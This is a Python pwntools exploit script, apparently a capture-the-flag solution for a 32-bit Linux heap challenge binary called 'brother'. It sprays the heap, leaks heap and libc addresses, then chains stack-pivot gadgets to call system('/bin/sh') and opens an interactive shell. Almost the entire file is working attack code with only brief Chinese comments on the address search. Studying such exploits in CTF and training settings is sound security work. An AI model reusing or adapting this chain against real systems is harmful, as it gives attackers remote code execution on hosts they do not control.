from pwn import *
import string
import os
from hashlib import sha256
context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'info'
context.terminal = ['tmux', 'split', '-h']
'''
def POW():
    context.log_level = 'debug'
    p.recvuntil('sha256(XXXX + ')
    end = p.recvuntil(') == ')[ : -5]
    hs = p.recvline()[ : -1]
    p.recvuntil(' : ')
    s = string.letters+string.digits
    for t1 in s:
        for t2 in s:
            for t3 in s:
                for t4 in s:
                    if sha256(t1 + t2 + t3 + t4 + end).hexdigest() == hs:
                        p.sendline(t1 + t2 + t3 + t4)
                        context.log_level = 'info'
                        return
    exit(0)
'''
def malloc(sz, data):
    p.recvuntil('>>> ')
    p.sendline('1')
    p.recvuntil(': ')
    p.sendline(str(sz))
    for buf, te in data:
        p.recvuntil(': ')
        p.sendline(buf)
        p.recvuntil(': ')
        p.sendline(str(te))
def show(s_idx, e_idx):
    p.recvuntil('>>> ')
    p.sendline('2')
    p.recvuntil(': ')
    p.sendline(str(s_idx))
    p.recvuntil(': ')
    p.sendline(str(e_idx))
def delete():
    p.recvuntil('>>> ')
    p.sendline('3')
def modify(idx, buf):
    p.recvuntil('>>> ')
    p.sendline('4')
    p.recvuntil(': ')
    p.sendline(str(idx))
    p.recvuntil(': ')
    p.sendline(buf)
def callfuc(idx):
    p.recvuntil('>>> ')
    p.sendline('5')
    p.recvuntil(': ')
    p.sendline(str(idx))
def GameStart(ip, port, debug):
    global p
    if debug == 1:
        p = process('./brother',env={'LD_PRELOAD':'./libc-2.23.so'})
    else:
        p = remote(ip, port)
    #POW()
    data = []
    for i in range(0x10):
        data.append(['X' * (0x20000 - 1), 1])
    malloc(0x20000, data)
    delete()

    for i in range(0x10):
        malloc(0x20000, data)

    data = []
    for i in range(0x10):
        data.append(['X' * (0x1000 - 1), 1])
    malloc(0x1000, data)
    delete()

    data = []
    for i in range(0x10):
        data.append(['X' * (0xf0 - 1), 0])
    malloc(0xf0, data)

    callfuc(0x100)
    show(0, 0x100)
    index = 0
    offest = 0
    out = ''
    for i in range(0x100):
        out = p.recvline()
        if 'W' in out:
            index = i
            break
    out = out[12 : ]
    offest = out.index('W')
    '''
    现在我们知道了是在bss_lis[index]的这个chunk的offset位置为0x58585858,即可以反推出bss_lis[index]=0x58585858-offset
    但这还不够，因为bss_lis的chunk之间并不是按index地址递增，我们只能确定前0x10*(index/0x10)的堆块是chunk[idx]与heap_base之间的一个offset.
    后半部分的offset具体是多少还要我们确定，当然我们可以盲猜一个(1/16的概率)，但是我们依然可以通过从magic_addr递减0x2008*count的方式进行搜索    
    heap_0xe20
    '''
    log.info('0x58585858 is : %d' % index)
    log.info('offest is : %d' % offest)
    log.info('start addr is : ' + hex(0x58585858 - offest))
    block_start = (index / 0x10) * 0x10
    magic_addr = 0x58585858
    delete()
    count = 1
    p_index = 0
    while 1:
        log.info("start find prev block count = %d" % count)
        data = []
        for i in range(0x10):
            data.append([p32(magic_addr - 0x20008 * count) * (0x1000 / 4 - 1),
    1])
        malloc(0x1000, data)
        delete()

        data = []
        for i in range(0x10):
            data.append(['X' * (0xa0 - 1), 0])
        malloc(0xa0, data)

        log.info("start call fuc count = %d" % count)
        callfuc(0x100)
        show(block_start - 0x10, index + 1)
        p_index = 0
        out = ''
        for i in range(index + 1 - block_start + 0x10):
            out = p.recvline()
            if 'W' in out:
                p_index = i + block_start - 0x10
                break
        delete()
        if p_index < block_start:
            break
        count += 1
    log.info('block start is : %d' % block_start)
    log.info('p_index is : %d' % p_index)
    heap_start_addr = magic_addr - 0x20008 * (count - 1 + 0x10 * (block_start / 0x10)) - offest - 8
    log.info('heap start is : ' + hex(heap_start_addr))
    for i in range(0x10):
        delete()

    data = []

    for i in range(0x10):
        data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])
    malloc(0x1000, data)
    delete()

    data = []
    for i in range(0x10):
        data.append(['aaa', 0])
    malloc(0xa0, data)
    callfuc(0)
    show(0, 0x10)
    for i in range(index + 1 - block_start + 0x10):
        out = p.recvline()
        out = out[12 : -1]
        if 'aaa' != out:
            libc_addr = u32(out[4 : 8]) + 1 - 0x1b07b0
            break
    log.info('libc addr is : ' + hex(libc_addr))
    delete()
    magic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword
    magic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;
    system_offest = 0x3a940
    binsh_addr = 0x15902b
    # gdb.attach(p)
    data = []
    for i in range(0x10):
        data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])
    malloc(0x1000, data)
    delete()

    data = []
    for i in range(0x10):
        data.append([(p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr
    + magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +
    p32(libc_addr + binsh_addr)).ljust(0xa0 -1, '\x00'), 0])
    malloc(0xa0, data)
    callfuc(0)
    p.interactive()
GameStart('10.112.100.47', 9999, 1)
